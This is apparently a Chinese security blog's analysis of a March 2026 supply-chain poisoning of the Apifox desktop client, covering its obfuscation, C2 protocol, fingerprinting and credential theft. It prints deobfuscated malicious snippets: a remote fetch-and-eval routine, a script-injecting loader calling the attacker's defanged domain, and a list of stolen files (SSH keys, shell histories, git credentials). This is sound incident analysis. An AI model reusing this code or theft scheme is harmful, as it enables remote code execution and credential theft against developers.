@@ -1,0 +1,948 @@
+<!DOCTYPE html>
+<html>
+  <head>
+<meta name="referrer" content="never">
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-CNTF3L2LQC"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-CNTF3L2LQC');
+</script>  <script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?a2d27f70a2f1f5f5edfb5884096627ae";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script> 
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="keywords" content="" />
+    <meta name="description" content="" />
+    
+    <title>
+      Apifox 供应链投毒攻击 — 完整技术分析 - 白帽酱の博客
+    </title>
+    <link rel="manifest" href="/manifest.json" />
+    <link rel="shortcut icon" href="/images/favicon.ico" type="image/x-icon" />
+    
+<link rel="stylesheet" href="/style/style.css">
+
+  <meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="白帽酱の博客" type="application/atom+xml">
+</head>
+  <body>
+    <canvas id='pagemap'></canvas>
+    
+    <div id="post-toc" class="animated hiddenToc hide">
+      <span class="title">Toc</span>
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E6%A6%82%E8%BF%B0"><span class="toc-text">一、概述</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B3%E4%BA%8E-apifox-it-com-%E5%9F%9F%E5%90%8D"><span class="toc-text">关于 apifox.it.com 域名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A2%AB%E5%8A%A8-DNS-%E6%97%B6%E9%97%B4%E7%BA%BF"><span class="toc-text">被动 DNS 时间线</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E8%A2%AB%E6%8A%95%E6%AF%92%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84"><span class="toc-text">二、被投毒文件结构</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E6%B7%B7%E6%B7%86%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90"><span class="toc-text">三、混淆技术分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E6%B7%B7%E6%B7%86%E8%BF%87%E7%A8%8B"><span class="toc-text">反混淆过程</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E5%8F%8D%E6%B7%B7%E6%B7%86%E5%90%8E%E7%9A%84%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90"><span class="toc-text">四、反混淆后的恶意代码分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#4-1-%E5%B5%8C%E5%85%A5-RSA-2048-%E7%A7%81%E9%92%A5"><span class="toc-text">4.1 嵌入 RSA-2048 私钥</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-2-%E6%9C%BA%E5%99%A8%E6%8C%87%E7%BA%B9%E9%87%87%E9%9B%86"><span class="toc-text">4.2 机器指纹采集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-3-Apifox-%E7%94%A8%E6%88%B7%E5%87%AD%E8%AF%81%E7%AA%83%E5%8F%96"><span class="toc-text">4.3 Apifox 用户凭证窃取</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-4-C2-%E9%80%9A%E4%BF%A1%E5%8D%8F%E8%AE%AE"><span class="toc-text">4.4 C2 通信协议</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-5-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="toc-text">4.5 远程代码执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-6-%E6%8C%81%E4%B9%85%E5%8C%96%E6%9C%BA%E5%88%B6"><span class="toc-text">4.6 持久化机制</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%94%E3%80%81%E6%94%BB%E5%87%BB%E8%BD%BD%E8%8D%B7%E6%B7%B1%E5%BA%A6%E5%88%86%E6%9E%90"><span class="toc-text">五、攻击载荷深度分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#5-1-Stage-1%EF%BC%9A%E5%8A%A0%E8%BD%BD%E5%99%A8%EF%BC%88Loader%EF%BC%89"><span class="toc-text">5.1 Stage-1：加载器（Loader）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-2-Stage-2-v1%EF%BC%9A%E4%BF%A1%E6%81%AF%E7%AA%83%E5%8F%96%EF%BC%88collectPreInformations%EF%BC%89"><span class="toc-text">5.2 Stage-2 v1：信息窃取（collectPreInformations）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AA%83%E5%8F%96%E7%9B%AE%E6%A0%87"><span class="toc-text">窃取目标</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%A4%96%E6%B3%84%E5%8D%8F%E8%AE%AE"><span class="toc-text">数据外泄协议</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-3-Stage-2-v2%EF%BC%9A%E7%BA%B5%E6%B7%B1%E7%AA%83%E5%8F%96%EF%BC%88collectAddInformations%EF%BC%89"><span class="toc-text">5.3 Stage-2 v2：纵深窃取（collectAddInformations）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-4-%E5%85%B3%E4%BA%8E-Stage-2-%E4%BB%A3%E7%A0%81%E4%B8%AD%E7%9A%84%E4%B8%AD%E6%96%87%E6%B3%A8%E9%87%8A"><span class="toc-text">5.4 关于 Stage-2 代码中的中文注释</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-5-%E6%9C%AA%E6%8D%95%E8%8E%B7%E7%9A%84%E5%90%8E%E7%BB%AD%E9%98%B6%E6%AE%B5%EF%BC%9A%E5%AE%8C%E6%95%B4%E7%9A%84%E7%81%B5%E6%B4%BB-C2-%E5%B9%B3%E5%8F%B0"><span class="toc-text">5.5 未捕获的后续阶段：完整的灵活 C2 平台</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%AD%E3%80%81%E5%AE%8C%E6%95%B4%E6%94%BB%E5%87%BB%E9%93%BE"><span class="toc-text">六、完整攻击链</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%83%E3%80%81C2-%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%A1%8C%E4%B8%BA%E7%89%B9%E5%BE%81"><span class="toc-text">七、C2 服务器行为特征</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%82%E6%B5%8B%E5%88%B0%E7%9A%84-Stage-2-URL-%E6%A0%B7%E6%9C%AC"><span class="toc-text">观测到的 Stage-2 URL 样本</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%AB%E3%80%81IoCs%EF%BC%88%E6%94%BB%E9%99%B7%E6%8C%87%E6%A0%87%EF%BC%89"><span class="toc-text">八、IoCs（攻陷指标）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BD%91%E7%BB%9C%E6%8C%87%E6%A0%87"><span class="toc-text">网络指标</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E6%8C%87%E6%A0%87"><span class="toc-text">主机指标</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%A0%E5%AF%86%E6%8C%87%E6%A0%87"><span class="toc-text">加密指标</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B9%9D%E3%80%81Wayback-Machine-%E5%AD%98%E6%A1%A3"><span class="toc-text">九、Wayback Machine 存档</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%81%E3%80%81%E5%8F%97%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4%E4%B8%8E%E9%A3%8E%E9%99%A9%E8%AF%84%E4%BC%B0"><span class="toc-text">十、受影响范围与风险评估</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%97%E5%BD%B1%E5%93%8D%E4%BA%BA%E7%BE%A4"><span class="toc-text">受影响人群</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A3%8E%E9%99%A9%E7%AD%89%E7%BA%A7%EF%BC%9A%F0%9F%94%B4-%E4%B8%A5%E9%87%8D%EF%BC%88Critical%EF%BC%89"><span class="toc-text">风险等级：🔴 严重（Critical）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%81%E4%B8%80%E3%80%81%E6%94%BB%E5%87%BB%E6%97%B6%E9%97%B4%E7%BA%BF%E6%80%BB%E8%A7%88"><span class="toc-text">十一、攻击时间线总览</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%81%E4%BA%8C%E3%80%81%E5%A4%84%E7%BD%AE%E5%BB%BA%E8%AE%AE"><span class="toc-text">十二、处置建议</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%B4%A7%E6%80%A5%E6%8E%AA%E6%96%BD"><span class="toc-text">紧急措施</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A3%80%E6%B5%8B%E6%96%B9%E6%B3%95"><span class="toc-text">检测方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%95%BF%E6%9C%9F%E5%BB%BA%E8%AE%AE"><span class="toc-text">长期建议</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%81%E4%B8%89%E3%80%81%E6%80%BB%E7%BB%93"><span class="toc-text">十三、总结</span></a></li></ol>
+    </div>
+    
+    <div id="fixed-menu-wrap">
+      <span class="iconfont icon-sousuo search-box menu-reset"></span>
+      <span class="icon-toc menu-reset">Toc</span>
+      <span class="iconfont icon-arrowup menu-reset"></span>
+    </div>
+    <div id="fixed-menu">
+      <span class="iconfont icon-menu-"></span>
+    </div>
+    <div id="progress">
+      <div class="line"></div>
+    </div>
+    <div id="search-shade" class="animated hiddenSearch hide">
+      <div class="input-wrap">
+        <span class="iconfont icon-sousuo search-box"></span>
+        <input type="text" placeholder="Search" />
+        <span class="iconfont icon-close"></span>
+      </div>
+      <div class="search-result">
+        <div class="meta">
+          <span><b id="result-count">0</b> results found</span>
+          <img src="/images/logo.jpeg" />
+        </div>
+        <ul id="result-box"></ul>
+      </div>
+    </div>
+    <div id="menu-mask" class="animated hideMenuMask hide">
+      <span class="iconfont icon-close"></span>
+      <div class="nav">
+        
+        <a href="/" class="">
+          首页
+        </a>
+        
+        <a href="/archives" class="">
+          归档
+        </a>
+        
+        <a href="/categories" class="">
+          分类
+        </a>
+        
+        <a href="/tags" class="">
+          标签
+        </a>
+        
+        <a href="/friends" class="">
+          友链
+        </a>
+        
+        <a href="/about" class="">
+          关于
+        </a>
+        
+      </div>
+    </div>
+    <div id="header">
+      <div class="intro">
+        <a href="/" class="logo" style="background-image: url('/images/logo.jpeg')"></a>
+        <div class="author">白帽酱</div>
+      </div>
+      <div class="nav">
+        <span class="iconfont icon-menu menu-icon"></span>
+        <a href="#" class="search-box">
+          <span class="iconfont icon-sousuo"></span>
+        </a>
+      </div>
+    </div>
+    <div id="side" class="animated bounceInLeft">
+      <div class="shrink">
+        <a href="/" class="logo" style="background-image: url('/images/logo.jpeg')"></a>
+        <span class="iconfont icon-menu toggle-icon"></span>
+        <a href="#" class="search-box">
+          <span class="iconfont icon-sousuo"></span>
+        </a>
+      </div>
+      <div class="magnify">
+        <div class="about">
+          <div class="author">白帽酱</div>
+          <a href="/" class="logo" style="background-image: url('/images/logo.jpeg')"></a>
+        </div>
+
+        <div class="nav">
+          
+          <a href="/" class="">
+            首页
+          </a>
+          
+          <a href="/archives" class="">
+            归档
+          </a>
+          
+          <a href="/categories" class="">
+            分类
+          </a>
+          
+          <a href="/tags" class="">
+            标签
+          </a>
+          
+          <a href="/friends" class="">
+            友链
+          </a>
+          
+          <a href="/about" class="">
+            关于
+          </a>
+          
+          <a href="#" class="search-box">
+            <span class="iconfont icon-sousuo"></span>
+          </a>
+        </div>
+        <div class="bottom">
+          <div class="follow">
+            
+            <a href="https://github.com/burpheart" target="_block">
+              <span class="iconfont icon-github"></span>
+            </a>
+            
+            <a href="https://twitter.com/burp_heart" target="_block">
+              <span class="iconfont icon-twitter"></span>
+            </a>
+            
+            <a href="https://space.bilibili.com/32890488" target="_block">
+              <span class="iconfont icon-bilibili"></span>
+            </a>
+             
+            <a href="/atom.xml" target="_block">
+              <span class="iconfont icon-rss"></span>
+            </a>
+            
+          </div>
+        </div>
+      </div>
+    </div>
+    <div id="container">
+      <div class="main animated bounceInRight delay-0.7s">
+        <article class="post-entry">
+    <div class="header">
+      
+      <div class="title">Apifox 供应链投毒攻击 — 完整技术分析</div>
+      <div class="meta">
+        <span class="item">
+          <span class="iconfont icon-time-circle"></span>
+          <span>2026/03/25</span>
+        </span>
+
+        
+
+         
+        <span class="item">
+          <span class="iconfont icon-folder"></span>
+          <span>
+              
+                
+                  <a href="/categories/WEB">WEB</a>
+                
+              
+          </span>
+        </span>
+        
+        
+        
+      </div>
+      <div>
+      </div>
+    </div>
+    <html><head></head><body><h2 id="一、概述">一、概述<a class="post-anchor" href="#一、概述"></a></h2><p>近日，工作中监测到 Apifox 文件存在被投毒情况。</p>
+<p><a target="_blank" rel="noopener" href="https://apifox.com/">Apifox</a> 是一款 API 一体化协作平台，其桌面端应用基于 <strong>Electron</strong> 框架开发，提供 <strong>Windows、macOS、Linux</strong> 三平台客户端。因未严格启用 <code>sandbox</code> 参数，并暴露了 Node.js 的 API 接口，导致攻击者可通过 JS 控制 Apifox 的终端——<strong>三个平台均受影响</strong>。</p>
+<p>Apifox 在启动过程中会加载：</p>
+<figure class="highlight plain"><table><tbody><tr><td class="code"><pre><code class="hljs plain">hxxps://cdn[.]apifox[.]com/www/assets/js/apifox-app-event-tracking.min.js<br></code></pre></td></tr></tbody></table></figure>
+
+<p>该文件正常大小为 <strong>34KB</strong>，但在 <strong>3 月 4 日之后</strong>可能会请求到被投毒的版本（<strong>77KB</strong>）。被投毒的 JS 文件会动态加载 <code>hxxps://apifox[.]it[.]com/public/apifox-event.js</code>（该域名非官方域名），在满足特定条件下加载攻击载荷，采集主机系统环境和敏感信息（SSH 密钥、Git 凭证、命令行历史、进程列表），上报到 <code>hxxps://apifox[.]it[.]com/event/0/log</code>。后续攻击者会控制主机拉取执行后门程序，并尝试发起横向攻击，控制更多有价值目标。</p>
+<p>目前入口文件已被还原，仅在 <a target="_blank" rel="noopener" href="https://web.archive.org/web/20260305160602/https://cdn.apifox.com/www/assets/js/user-tracking.min.js">Wayback Machine 存档</a>中可见投毒版本。</p>
+<span id="more"></span>
+
+<h3 id="关于-apifox-it-com-域名">关于 <code>apifox.it.com</code> 域名<a class="post-anchor" href="#关于-apifox-it-com-域名"></a></h3><p>攻击者使用的 C2 域名 <code>apifox.it.com</code> 极具迷惑性，值得单独说明。</p>
+<p><code>.it.com</code> 并非意大利国别域名 <code>.it</code> 的子域，而是一个<strong>商业性质的二级域名服务</strong>，由 <code>it.com</code> 域名持有者提供类似”子域名注册”的商业服务。它不属于 ICANN 标准注册局体系，不受标准 gTLD/ccTLD 监管约束，<strong>无公开 WHOIS 信息可查</strong>，注册门槛极低，非常适合被攻击者滥用。</p>
+<p>从受害者视角来看，<code>apifox.it.com</code> 在第一眼很容易被误认为：</p>
+<ul>
+<li>Apifox 的<strong>内部测试/研发域名</strong>（类似 <code>apifox.internal.com</code>）</li>
+<li>Apifox <strong>意大利区域</strong>的服务域名</li>
+<li>Apifox 官方的某个子产品域名</li>
+</ul>
+<p>这种域名选择体现了攻击者在<strong>社会工程学</strong>层面的精心设计——利用域名的视觉相似性和 <code>.it.com</code> 的模糊属性来降低被怀疑的概率。</p>
+<h3 id="被动-DNS-时间线">被动 DNS 时间线<a class="post-anchor" href="#被动-DNS-时间线"></a></h3><p>通过被动 DNS 查询，<code>apifox[.]it[.]com</code> 的历史 A 记录如下：</p>
+<table>
+<thead>
+<tr>
+<th>IP 地址</th>
+<th>所属组织</th>
+<th>首次发现</th>
+<th>最后发现</th>
+<th>持续时间</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>104.21.2.104</code></td>
+<td>Cloudflare, Inc.</td>
+<td>2026-03-04</td>
+<td>2026-03-22</td>
+<td><strong>18 天</strong></td>
+</tr>
+<tr>
+<td><code>172.67.129.21</code></td>
+<td>Cloudflare, Inc.</td>
+<td>2026-03-04</td>
+<td>2026-03-22</td>
+<td><strong>18 天</strong></td>
+</tr>
+</tbody></table>
+<p>无 AAAA（IPv6）记录，攻击者未配置 IPv6 解析。</p>
+<p>关键时间节点：</p>
+<figure class="highlight plain"><table><tbody><tr><td class="code"><pre><code class="hljs plain">2026-03-04  域名解析上线（Cloudflare 托管），投毒开始<br>     │<br>     ├── 03-04 ~ 03-22  活跃期（18天），通过 Cloudflare CDN 分发恶意载荷<br>     │<br>2026-03-22  DNS 记录下线，域名不再解析<br>     │<br>2026-03-25  验证时 DNS 已失效，但源站 IP 仍在响应（C2 后端未关闭）<br></code></pre></td></tr></tbody></table></figure>
+
+<p>攻击者利用 <strong>Cloudflare</strong> 作为前置 CDN 代理，既隐藏了真实源站 IP，又获得了合法的 HTTPS 证书和全球加速能力，使恶意流量在网络层面更难以与正常 CDN 流量区分。DNS 记录在活跃 18 天后被移除，可能是攻击者主动撤收、也可能是被 Cloudflare 或域名服务商处置。</p>
+<hr>
+<h2 id="二、被投毒文件结构">二、被投毒文件结构<a class="post-anchor" href="#二、被投毒文件结构"></a></h2><p>投毒后的 <code>apifox-app-event-tracking.min.js</code>（77KB）由两部分组成：</p>
+<table>
+<thead>
+<tr>
+<th>区域</th>
+<th>大小</th>
+<th>内容</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>第一部分</td>
+<td>~34KB</td>
+<td><strong>合法</strong> Apifox 事件追踪 SDK（Webpack 打包）</td>
+</tr>
+<tr>
+<td>第二部分</td>
+<td>~42KB</td>
+<td><strong>⚠️ 恶意后门代码</strong>（严重混淆）</td>
+</tr>
+</tbody></table>
+<p>合法 SDK 包含 GA4、百度统计、阿里云 SLS、PostHog 等多平台事件追踪模块，本身不存在恶意行为。攻击者在该文件末尾<strong>追加</strong>了约 42KB 的严重混淆 JavaScript 代码。</p>
+<blockquote>
+<p>注：通过 Wayback Machine 存档获取的版本头部包含约 1KB 的 wombat 代理包装器代码，这是 Wayback Machine 自动注入的回放层，并非投毒文件本身的内容。</p>
+</blockquote>
+<hr>
+<h2 id="三、混淆技术分析">三、混淆技术分析<a class="post-anchor" href="#三、混淆技术分析"></a></h2><p>恶意代码采用了 <strong>7 层混淆</strong>，逆向难度极高：</p>
+<table>
+<thead>
+<tr>
+<th>技术</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>字符串数组旋转</td>
+<td><code>_0x10e4()</code> 函数返回 300+ 条编码字符串，通过 IIFE 暴力旋转数组到目标偏移</td>
+</tr>
+<tr>
+<td>Base64 + RC4 双层解密</td>
+<td><code>_0x3fb9()</code> 解码器对字符串先 Base64 解码，再 RC4 解密还原明文</td>
+</tr>
+<tr>
+<td>代理函数</td>
+<td><code>_0x2c838a</code>、<code>_0x15440c</code> 等函数包装解码器，增加间接调用层次</td>
+</tr>
+<tr>
+<td>十六进制算术混淆</td>
+<td>所有数值常量使用复杂十六进制算术表达式（如 <code>0x2425+-0x1*-0x415+0x80b*-0x5</code> 表示简单数字）</td>
+</tr>
+<tr>
+<td>控制流扁平化</td>
+<td>通过对象属性间接调用函数，打乱执行逻辑顺序</td>
+</tr>
+<tr>
+<td>死代码注入</td>
+<td>大量永远不会执行的代码分支，增加分析干扰</td>
+</tr>
+<tr>
+<td>反调试陷阱</td>
+<td><code>toString</code> 正则检测 + 条件无限递归，检测到调试器则触发死循环</td>
+</tr>
+</tbody></table>
+<h3 id="反混淆过程">反混淆过程<a class="post-anchor" href="#反混淆过程"></a></h3><p>通过精确复现 Base64 解码和 RC4 解密逻辑，暴力枚举字符串数组的旋转偏移量（最终确定为偏移 275），成功解密全部 300+ 条编码字符串，还原出完整的恶意代码逻辑。</p>
+<hr>
+<h2 id="四、反混淆后的恶意代码分析">四、反混淆后的恶意代码分析<a class="post-anchor" href="#四、反混淆后的恶意代码分析"></a></h2><p>完整还原后的恶意代码为纯 Node.js 脚本，核心功能如下：</p>
+<h3 id="4-1-嵌入-RSA-2048-私钥">4.1 嵌入 RSA-2048 私钥<a class="post-anchor" href="#4-1-嵌入-RSA-2048-私钥"></a></h3><p>恶意代码中硬编码了一个 RSA-2048 私钥（PKCS#8 格式，1703 字符），用于：</p>
+<ul>
+<li><strong>加密</strong>上报的敏感信息：从私钥中提取公钥，使用 <code>publicEncrypt</code>（OAEP 填充）加密后附加到 HTTP 请求头</li>
+<li><strong>解密</strong> C2 服务器下发的指令：使用 <code>privateDecrypt</code>（OAEP + SHA-256）解密 Stage-1 payload</li>
+</ul>
+<figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> PRIVATE_KEY = <span class="hljs-string">`-----BEGIN PRIVATE KEY-----</span><br><span class="hljs-string">MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQDOPeHTeyrblELD</span><br><span class="hljs-string">O/JYR80HQvCZMd6QEOmHNdI9tTQfVNHvU/31MhMymSQMq2cCx5+RbJ1fSQ9/5rkx</span><br><span class="hljs-string">...（共 24 行）...</span><br><span class="hljs-string">1HPFW7rGjV82Fu3No+rLjlo=</span><br><span class="hljs-string">-----END PRIVATE KEY-----`</span>;<br></code></pre></td></tr></tbody></table></figure>
+
+<blockquote>
+<p>注：攻击者将私钥嵌入客户端代码，这使得任何获取该代码的人都能解密 C2 通信——这是攻击者的设计失误，也是本次分析能够完整还原攻击链的关键。</p>
+</blockquote>
+<h3 id="4-2-机器指纹采集">4.2 机器指纹采集<a class="post-anchor" href="#4-2-机器指纹采集"></a></h3><p>恶意代码通过以下字段构造机器唯一标识：</p>
+<figure class="highlight plain"><table><tbody><tr><td class="code"><pre><code class="hljs plain">MAC地址 + CPU型号 + 主机名 + 用户主目录 + 操作系统平台<br></code></pre></td></tr></tbody></table></figure>
+
+<p>将拼接的字符串进行 SHA-256 哈希，得到 64 字符的十六进制指纹（<code>af_uuid</code>），存储在 <code>localStorage</code> 的 <code>_rl_mc</code> 键中。</p>
+<h3 id="4-3-Apifox-用户凭证窃取">4.3 Apifox 用户凭证窃取<a class="post-anchor" href="#4-3-Apifox-用户凭证窃取"></a></h3><p>恶意代码从 <code>localStorage</code> 读取 <code>common.accessToken</code>（Apifox 登录令牌），利用该令牌调用官方 API 获取用户信息：</p>
+<figure class="highlight plain"><table><tbody><tr><td class="code"><pre><code class="hljs plain">GET hxxps://api[.]apifox[.]com/api/v1/user<br>Authorization: &lt;accessToken&gt;<br></code></pre></td></tr></tbody></table></figure>
+
+<p>从响应中提取用户 <strong>邮箱</strong> 和 <strong>姓名</strong>，经 RSA 加密后附加到后续请求头中。</p>
+<h3 id="4-4-C2-通信协议">4.4 C2 通信协议<a class="post-anchor" href="#4-4-C2-通信协议"></a></h3><p>恶意代码向 C2 服务器发送带有以下自定义 HTTP 头的请求：</p>
+<table>
+<thead>
+<tr>
+<th>Header 字段</th>
+<th>内容</th>
+<th>加密方式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>af_uuid</code></td>
+<td>机器指纹 SHA-256</td>
+<td>明文</td>
+</tr>
+<tr>
+<td><code>af_os</code></td>
+<td>操作系统类型 + 版本号</td>
+<td>明文</td>
+</tr>
+<tr>
+<td><code>af_user</code></td>
+<td>用户主目录路径</td>
+<td>RSA-2048 OAEP</td>
+</tr>
+<tr>
+<td><code>af_name</code></td>
+<td>主机名</td>
+<td>RSA-2048 OAEP</td>
+</tr>
+<tr>
+<td><code>af_apifox_user</code></td>
+<td>Apifox 账户邮箱</td>
+<td>RSA-2048 OAEP</td>
+</tr>
+<tr>
+<td><code>af_apifox_name</code></td>
+<td>Apifox 账户姓名</td>
+<td>RSA-2048 OAEP</td>
+</tr>
+</tbody></table>
+<h3 id="4-5-远程代码执行">4.5 远程代码执行<a class="post-anchor" href="#4-5-远程代码执行"></a></h3><figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> r = <span class="hljs-keyword">await</span> fetch(REMOTE_JS_URL, { <span class="hljs-attr">headers</span>: h });<br><span class="hljs-keyword">const</span> payload = (<span class="hljs-keyword">await</span> r.text()).trim();<br><span class="hljs-keyword">const</span> code = rsaDecrypt(payload);<br><span class="hljs-built_in">eval</span>(code); <span class="hljs-comment">// ⚠️ 任意远程代码执行</span><br></code></pre></td></tr></tbody></table></figure>
+
+<p>从 C2 获取 RSA 加密的 payload → 私钥解密 → <strong><code>eval()</code> 直接执行</strong>，实现完全的远程代码执行能力。</p>
+<h3 id="4-6-持久化机制">4.6 持久化机制<a class="post-anchor" href="#4-6-持久化机制"></a></h3><p>执行完毕后，通过 <code>setTimeout</code> 在 <strong>30 分钟 ~ 3 小时</strong>的随机间隔后重新执行整个流程，只要 Apifox 应用保持运行，恶意代码就会持续活跃。</p>
+<hr>
+<h2 id="五、攻击载荷深度分析">五、攻击载荷深度分析<a class="post-anchor" href="#五、攻击载荷深度分析"></a></h2><p>通过提取的 RSA 私钥解密 C2 返回的数据，我们获得了攻击者实际下发的完整攻击载荷。攻击分为两个阶段：</p>
+<h3 id="5-1-Stage-1：加载器（Loader）">5.1 Stage-1：加载器（Loader）<a class="post-anchor" href="#5-1-Stage-1：加载器（Loader）"></a></h3><p>C2 服务器（<code>hxxps://apifox[.]it[.]com/public/apifox-event.js</code>）返回 <strong>344 字节</strong>的 Base64 编码 RSA 加密数据，解密后为：</p>
+<figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><code class="hljs javascript">(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>{<br>  <span class="hljs-keyword">var</span> s = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">'script'</span>);<br>  s.src = <span class="hljs-string">'hxxps://apifox[.]it[.]com/&lt;随机8位hex&gt;.js'</span>;<br>  s.onload = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>{ s.parentNode &amp;&amp; s.parentNode.removeChild(s) };<br>  <span class="hljs-built_in">document</span>.head.appendChild(s)<br>})()<br></code></pre></td></tr></tbody></table></figure>
+
+<p>关键特点：</p>
+<ul>
+<li><strong>路径随机化</strong>：每次请求生成不同的 Stage-2 文件名（如 <code>b8ee3b68.js</code>、<code>f51782ec.js</code>、<code>c74fe621.js</code>），阻碍基于 URL 的检测</li>
+<li><strong>用完即焚</strong>：历史路径访问返回 404，只有最新生成的路径有效</li>
+<li><strong>反取证</strong>：脚本加载完毕后自动从 DOM 中移除 <code>&lt;script&gt;</code> 标签</li>
+<li><strong>服务端绑定</strong>：C2 服务器读取 Stage-1 请求中的 <code>af_uuid</code> header，将其硬编码到 Stage-2 代码中，实现客户端追踪</li>
+</ul>
+<h3 id="5-2-Stage-2-v1：信息窃取（collectPreInformations）">5.2 Stage-2 v1：信息窃取（collectPreInformations）<a class="post-anchor" href="#5-2-Stage-2-v1：信息窃取（collectPreInformations）"></a></h3><p>Stage-2 为<strong>明文</strong> Node.js 脚本（约 3,400 字节），代码中保留了完整的中文开发注释（详见 5.4 节）。</p>
+<h4 id="窃取目标">窃取目标<a class="post-anchor" href="#窃取目标"></a></h4><p><strong>全平台通用：</strong></p>
+<ul>
+<li><code>~/.ssh/</code> — 递归读取整个目录（私钥、公钥、config、known_hosts、authorized_keys）</li>
+</ul>
+<p><strong>macOS / Linux 额外窃取：</strong></p>
+<ul>
+<li><code>~/.zsh_history</code> — Zsh 命令行历史（含密码、Token、内部 URL）</li>
+<li><code>~/.bash_history</code> — Bash 命令行历史</li>
+<li><code>~/.git-credentials</code> — Git 明文凭证（GitHub PAT、GitLab Token）</li>
+<li><code>ps aux</code> — 完整进程列表</li>
+</ul>
+<p><strong>Windows 额外窃取：</strong></p>
+<ul>
+<li><code>tasklist</code> — 进程列表</li>
+</ul>
+<h4 id="数据外泄协议">数据外泄协议<a class="post-anchor" href="#数据外泄协议"></a></h4><figure class="highlight plain"><table><tbody><tr><td class="code"><pre><code class="hljs plain">原始 JSON → Gzip 压缩 → AES-256-GCM 加密 → Base64 编码 → POST 上传<br></code></pre></td></tr></tbody></table></figure>
+
+<p>AES 加密参数：</p>
+<ul>
+<li><strong>密码</strong>：<code>apifox</code></li>
+<li><strong>盐值</strong>：<code>foxapi</code></li>
+<li><strong>密钥派生</strong>：<code>scryptSync(password, salt, 32)</code></li>
+<li><strong>IV</strong>：12 字节随机值</li>
+<li><strong>格式</strong>：<code>Base64(IV[12] + AuthTag[16] + CipherText)</code></li>
+</ul>
+<p>上传端点：</p>
